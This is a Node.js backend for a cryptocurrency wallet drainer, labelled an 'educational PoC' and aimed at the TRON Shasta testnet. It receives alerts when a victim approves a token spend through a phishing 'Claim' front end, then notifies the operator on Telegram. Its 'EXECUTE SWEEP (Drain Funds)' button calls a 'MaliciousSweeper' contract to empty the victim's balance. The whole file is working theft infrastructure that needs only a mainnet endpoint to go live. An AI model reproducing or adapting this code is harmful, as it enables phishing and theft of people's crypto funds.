require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Telegraf } = require('telegraf');
const TronWeb = require('tronweb');

const app = express();
app.use(cors());
app.use(express.json());

// Initialize TronWeb for Shasta Testnet
const tronWeb = new TronWeb({
    fullHost: 'https://api.shasta.trongrid.io',
    privateKey: process.env.ATTACKER_PRIVATE_KEY
});

const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
const SWEEPER_ADDRESS = process.env.SWEEPER_ADDRESS;

// Initialize Telegram Bot
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// In-memory storage for the demo
const victims = [];

// 1. Endpoint called by Frontend when victim clicks "Claim"
app.post('/api/alert', async (req, res) => {
    const { victimAddress, txHash } = req.body;
    
    // Prevent duplicate alerts
    if (!victims.find(v => v.address === victimAddress)) {
        victims.push({ address: victimAddress, status: 'APPROVED', time: Date.now() });
    }

    console.log(`\n[ALERT] Victim Approved: ${victimAddress}`);

    const message = `🚨 *EDUCATIONAL POC: APPROVAL DETECTED* 🚨\n\n` +
                    `👤 Victim: \`${victimAddress}\`\n` +
                    `🪙 Token: \`${TOKEN_ADDRESS}\`\n` +
                    `🔗 Approve Tx: [View](https://shasta.tronscan.org/#/transaction/${txHash})\n\n` +
                    `⚠️ Funds are now vulnerable. Click below to execute the drain.`;

    // Create the interactive "Sweep" button
    const keyboard = {
        inline_keyboard: [
            [{ text: '🕷️ EXECUTE SWEEP (Drain Funds)', callback_data: `sweep_${victimAddress}` }]
        ]
    };

    try {
        await bot.telegram.sendMessage(CHAT_ID, message, { 
            parse_mode: 'Markdown', 
            reply_markup: keyboard 
        });
        res.json({ success: true });
    } catch (err) {
        console.error("Telegram error:", err.message);
        res.status(500).json({ error: err.message });
    }
});

// 2. Handle the Telegram Button Click
bot.action(/sweep_(.+)/, async (ctx) => {
    const victimAddress = ctx.match[1];
    
    // Acknowledge the click immediately so Telegram doesn't show an error
    await ctx.answerCbQuery('⏳ Initiating transferFrom...');
    await ctx.editMessageText(`🕷️ *Sweeping funds from ${victimAddress}...*\nPlease wait for blockchain confirmation.`, { parse_mode: 'Markdown' });

    try {
        // Load the MaliciousSweeper contract
        const sweeperContract = await tronWeb.contract().at(SWEEPER_ADDRESS);
        
        // Execute sweepAll
        const tx = await sweeperContract.sweepAll(TOKEN_ADDRESS, victimAddress).send({
            feeLimit: 100000000 // 100 TRX fee limit
        });

        console.log(`[SWEEP] Transaction sent: ${tx}`);

        // Wait for the transaction to be mined on Shasta
        let info = await tronWeb.trx.getTransactionInfo(tx);
        let attempts = 0;
        while ((!info || !info.id) && attempts < 15) {
            await new Promise(r => setTimeout(r, 2000));
            info = await tronWeb.trx.getTransactionInfo(tx);
            attempts++;
        }

        if (info && info.id) {
            const successMsg = `✅ *SUCCESSFULLY DRAINED!*\n\n` +
                               `👤 Victim: \`${victimAddress}\`\n` +
                               `💸 Sweep Tx: [View on Tronscan](https://shasta.tronscan.org/#/transaction/${tx})\n\n` +
                               `_Victim balance is now 0._`;
            await ctx.editMessageText(successMsg, { parse_mode: 'Markdown' });
        } else {
            await ctx.editMessageText(`❌ Transaction failed to confirm in time.`);
        }

    } catch (error) {
        console.error("Sweep error:", error);
        await ctx.editMessageText(`❌ *Sweep Failed!*\n\nError: ${error.message || error}`, { parse_mode: 'Markdown' });
    }
});

// Start Server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`🛡️ Educational PoC Backend running on port ${PORT}`);
    console.log(`🤖 Telegram Bot initialized.`);
});